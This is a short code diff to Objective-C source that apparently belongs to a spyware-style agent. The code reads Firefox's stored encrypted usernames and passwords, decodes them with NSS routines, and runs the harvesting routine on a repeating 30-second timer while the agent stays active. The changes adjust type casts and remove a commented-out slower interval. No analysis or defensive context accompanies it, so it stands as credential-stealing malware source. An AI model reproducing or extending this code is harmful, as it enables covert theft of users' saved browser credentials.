@@ -304,8 +304,8 @@ BOOL nssLoaded = NO;
                 NSString *encryptedUsername = [login objectForKey:@"encryptedUsername"];
                 NSString *encryptedPassword = [login objectForKey:@"encryptedPassword"];
                 
-                const unsigned char *charEncUsr = (const unsigned char *) [encryptedUsername UTF8String];
-                const unsigned char *charEncPwd = (const unsigned char *) [encryptedPassword UTF8String];
+                const /*unsigned*/ char *charEncUsr = (const /*unsigned*/ char *) [encryptedUsername UTF8String];
+                const /*unsigned*/ char *charEncPwd = (const /*unsigned*/ char *) [encryptedPassword UTF8String];
                 SECItem *secuser = NULL, *secpass = NULL, user = { siBuffer, NULL, 0 }, pass = { siBuffer, NULL, 0 };
                 
                 if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, charEncUsr, strlen(charEncUsr))))
@@ -622,7 +622,7 @@ BOOL nssLoaded = NO;
 
     
     NSTimer *timer = nil;
-    timer = [NSTimer scheduledTimerWithTimeInterval: /*900*/30 target:self selector:@selector(_getFirefoxPasswordTimer:) userInfo:nil repeats:YES];
+    timer = [NSTimer scheduledTimerWithTimeInterval: 30 target:self selector:@selector(_getFirefoxPasswordTimer:) userInfo:nil repeats:YES];
     [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];
 
     while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
